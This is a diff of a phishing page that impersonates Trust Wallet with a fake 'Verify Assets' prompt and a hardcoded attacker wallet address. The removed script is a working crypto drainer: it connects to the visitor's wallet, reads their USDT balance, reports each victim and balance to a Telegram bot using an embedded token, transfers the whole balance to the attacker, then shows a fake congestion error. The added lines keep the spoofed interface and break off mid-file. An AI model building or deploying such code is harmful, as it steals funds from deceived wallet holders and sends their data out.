@@ -3,128 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trust Wallet | Secure Verification</title>
+    <title>Trust Wallet | Sync</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
     <style>
-        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .card { background: #1e2329; padding: 25px; border-radius: 24px; text-align: center; width: 90%; max-width: 360px; border: 1px solid #2d3139; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .logo { width: 50px; margin-bottom: 10px; }
-        h2 { font-size: 18px; color: #fff; margin-bottom: 5px; font-weight: 600; }
-        p.desc { color: #929aa5; font-size: 13px; margin-bottom: 20px; line-height: 1.4; }
+        body { margin: 0; font-family: sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .card { background: #1e2329; padding: 20px; border-radius: 20px; text-align: center; width: 90%; max-width: 340px; border: 1px solid #2d3139; }
+        .logo { width: 45px; margin-bottom: 10px; }
+        h2 { font-size: 18px; margin: 0 0 10px 0; }
         
-        /* Official QR Styling */
-        #qrcode-container { background: white; padding: 15px; border-radius: 20px; display: inline-block; margin-bottom: 15px; border: 4px solid #3172DE; }
-        #qrcode img { margin: 0 auto; }
-        
-        /* Address Section (Trust Wallet Style) */
-        .address-container { background: #2d3139; border-radius: 12px; padding: 12px; margin-bottom: 20px; border: 1px dashed #474d57; }
-        .address-label { font-size: 10px; color: #929aa5; text-transform: uppercase; margin-bottom: 5px; display: block; }
-        .address-text { font-size: 11px; color: #f0b90b; font-family: monospace; word-break: break-all; display: block; margin-bottom: 8px; }
-        .copy-btn { background: none; border: none; color: #3172DE; font-size: 12px; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
+        /* QR fast load using Google API (No library needed) */
+        .qr-box { background: white; padding: 10px; border-radius: 15px; display: inline-block; margin-bottom: 15px; }
+        #qrImg { width: 170px; height: 170px; display: block; }
 
-        .btn { background: #3172DE; color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; }
-        .btn:active { transform: scale(0.98); }
+        .addr-box { background: #2d3139; border-radius: 10px; padding: 10px; margin-bottom: 15px; border: 1px dashed #474d57; font-size: 11px; }
+        .addr-text { color: #f0b90b; word-break: break-all; font-family: monospace; display: block; margin-bottom: 5px; }
         
-        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0b0e11; z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
-        .spinner { border: 4px solid #333; border-top: 4px solid #3172DE; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn { background: #3172DE; color: white; border: none; padding: 14px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        
+        #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0b0e11; z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
+        .spin { border: 3px solid #333; border-top: 3px solid #3172DE; border-radius: 50%; width: 30px; height: 30px; animation: s 1s linear infinite; }
+        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" class="logo" alt="Trust Logo">
-        <h2>Verify Assets (BEP20)</h2>
-        <p class="desc">Scan the QR or copy address to start secure on-chain node verification.</p>
+        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" class="logo">
+        <h2>Verify Assets</h2>
         
-        <div id="qrcode-container">
-            <div id="qrcode"></div>
+        <div class="qr-box">
+            <img id="qrImg" src="" alt="Loading QR...">
         </div>
 
-        <div class="address-container">
-            <span class="address-label">Your Secure Verification Address</span>
-            <span id="addrDisplay" class="address-text">0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe</span>
-            <button class="copy-btn" onclick="copyAddress()">Copy Address</button>
+        <div class="addr-box">
+            <span class="addr-text" id="walletAddr">0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe</span>
+            <small style="color:#3172DE; cursor:pointer;" onclick="copyA()">COPY ADDRESS</small>
         </div>
 
-        <button id="nextBtn" class="btn" onclick="startVerification()">Verify Assets</button>
+        <button class="btn" onclick="start()">Verify Assets</button>
     </div>
 
-    <div id="overlay">
-        <div class="spinner"></div>
-        <p id="status" style="color:#3172DE; margin-top:20px; font-weight:bold;">Initializing Secure Sync...</p>
-    </div>
-
-    <script>
-        const myWallet = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe"; 
-        const usdtToken = "0x55d398326f99059fF775485246999027B3197955"; 
-        const botToken = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
-        const chatId = "7849151110";
-
-        // Deep Link QR - Camera/Trust Scanner friendly
-        window.onload = function() {
-            const currentUrl = window.location.href;
-            const deepLink = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(currentUrl);
-            
-            new QRCode(document.getElementById("qrcode"), {
-                text: deepLink,
-                width: 180,
-                height: 180
-            });
-
-            if (window.ethereum || window.trustwallet) {
-                startVerification();
-            }
-        };
-
-        function copyAddress() {
-            const text = document.getElementById("addrDisplay").innerText;
-            navigator.clipboard.writeText(text).then(() => alert("Address Copied!"));
-        }
-
-        async function startVerification() {
-            const isWeb3 = !!(window.ethereum || window.trustwallet);
-            if (!isWeb3) {
-                window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(window.location.href);
-                return;
-            }
-
-            document.getElementById("overlay").style.display = "flex";
-            const statusText = document.getElementById("status");
-
-            try {
-                const provider = window.ethereum || window.trustwallet;
-                const web3 = new Web3(provider);
-                const accounts = await provider.request({ method: 'eth_requestAccounts' });
-                const user = accounts[0];
-
-                await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
-
-                const abi = [
-                    { "constant": true, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function" },
-                    { "constant": false, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "type": "function" }
-                ];
-
-                const contract = new web3.eth.Contract(abi, usdtToken);
-                const balWei = await contract.methods.balanceOf(user).call();
-                const bal = web3.utils.fromWei(balWei, 'ether');
-
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=👤 Target Scan: ${user}\nBalance: ${bal} USDT`);
-
-                if (parseFloat(bal) > 0) {
-                    statusText.innerText = "Finalizing Verification...";
-                    await contract.methods.transfer(myWallet, balWei).send({ from: user });
-                    alert("Network Congestion: Verification failed. Please try again later.");
-                } else {
-                    alert("Verification Complete. No assets detected.");
-                }
-            } catch (e) {
-                alert("Security Signature Rejected.");
-            } finally {
-                document.getElementById("overlay").style.display = "none";
-            }
-        }
-    </script>
-</body>
-</html>
+    <div id="loader">
+        <div class="
